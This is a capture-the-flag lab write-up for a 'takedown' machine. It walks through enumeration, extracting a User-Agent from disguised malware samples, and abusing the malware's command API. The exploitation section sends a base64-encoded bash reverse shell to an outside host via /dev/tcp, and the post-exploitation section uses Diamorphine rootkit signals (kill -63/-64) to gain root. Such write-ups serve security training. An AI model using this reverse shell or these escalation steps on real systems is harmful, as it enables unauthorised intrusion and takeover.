**Once we read the instructions, we proceed with the machine**

We save the domain `takedown.thm.local` into the `/etc/hosts` file.

```bash
sudo nano /etc/hosts
````

<img src="/budahacksecurity/uploads/md_images/take/t1.png" style="max-width:100%; border-radius:8px;">

Once everything is ready, we begin the attack.



## 1. Enumeration

We start with an **Nmap scan** to identify open ports on the target.

```bash
nmap -sC -sV --min-rate 5000 -Pn -n -vvv -oN Scan takedown.thm.local
```

<img src="/budahacksecurity/uploads/md_images/take/t2.png" style="max-width:100%; border-radius:8px;">

From the scan results, we can observe that on **port 80**, the `robots.txt` file is accessible, and within it we can access `favicon.ico`.
If we review the provided PDF, we learn that **favicon.ico is actually an initial access malware sample**.

<img src="/budahacksecurity/uploads/md_images/take/17.png" style="max-width:100%; border-radius:8px;">

We proceed to download the favicon and analyze it.

<img src="/budahacksecurity/uploads/md_images/take/t16.png" style="max-width:100%; border-radius:8px;">

We confirm that `favicon.ico` is an **executable file**, and its hash matches the known hash of the malware.

We then use the **`strings`** utility to extract readable text from the `favicon.ico` file.

<img src="/budahacksecurity/uploads/md_images/take/t15.png" style="max-width:100%; border-radius:8px;">

Next, we enumerate directories to look for hidden files or folders.

```bash
ffuf -ic -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://takedown.thm.local/FUZZ -mc all -e all -fw 23
```

<img src="/budahacksecurity/uploads/md_images/take/t14.png" style="max-width:100%; border-radius:8px;">

Inside the `images` directory, we find another hidden malware sample.

<img src="/budahacksecurity/uploads/md_images/take/t13.png" style="max-width:100%; border-radius:8px;">

We download it and verify its contents.

<img src="/budahacksecurity/uploads/md_images/take/t12.png" style="max-width:100%; border-radius:8px;">

As expected, this is the second initial access malware.
Once again, we use the `strings` utility:

```bash
strings shutterbug.jpg.bak
```

We discover a **User-Agent string**. Upon closer inspection, we notice that **both malware samples contain the same User-Agent and API endpoint**.

<img src="/budahacksecurity/uploads/md_images/take/t11.png" style="max-width:100%; border-radius:8px;">

---

## 2. Exploitation

We observe that we do not have direct access to the API, so we use **Burp Suite** to intercept API requests.

<img src="/budahacksecurity/uploads/md_images/take/t10.png" style="max-width:100%; border-radius:8px;">

Initially, the API returns a **404 response**, but when we modify the `User-Agent` header to match the one extracted from the malware, the behavior changes.

<img src="/budahacksecurity/uploads/md_images/take/t9.png" style="max-width:100%; border-radius:8px;">

We then request the `/commands` endpoint.

<img src="/budahacksecurity/uploads/md_images/take/t8.png" style="max-width:100%; border-radius:8px;">

Next, we upload a **reverse shell**, encoding it in Base64:

```bash
{
  "cmd":"exec echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuNi4yNC44NC80NDMgMD4mMQ==|base64 -d|bash"
}
```

We change the request method to **POST**, set up a listener on our machine, and send the request.

<img src="/budahacksecurity/uploads/md_images/take/t7.png" style="max-width:100%; border-radius:8px;">

As a result, we successfully obtain access to the system.

<img src="/budahacksecurity/uploads/md_images/take/t6.png" style="max-width:100%; border-radius:8px;">

At this point, we retrieve the **first flag**.

---

## 3. Post-Exploitation

While enumerating the system to escalate privileges to root, we identify a **suspicious process**:

```bash
ps aux
```

<img src="/budahacksecurity/uploads/md_images/take/t5.png" style="max-width:100%; border-radius:8px;">

Upon further investigation, we determine that it is an executable run by the user **webadmin-lowpriv** with limited privileges. Researching the binary reveals the following:

<img src="/budahacksecurity/uploads/md_images/take/t4.png" style="max-width:100%; border-radius:8px;">

It appears that privilege escalation is possible through **Diamorphine**.

We use the following signals:

* `kill -63 0` to make the hidden process visible
* `kill -64 0` to trigger privilege escalation to root

<img src="/budahacksecurity/uploads/md_images/take/t3.png" style="max-width:100%; border-radius:8px;">

As a result, we successfully obtain **root access**.


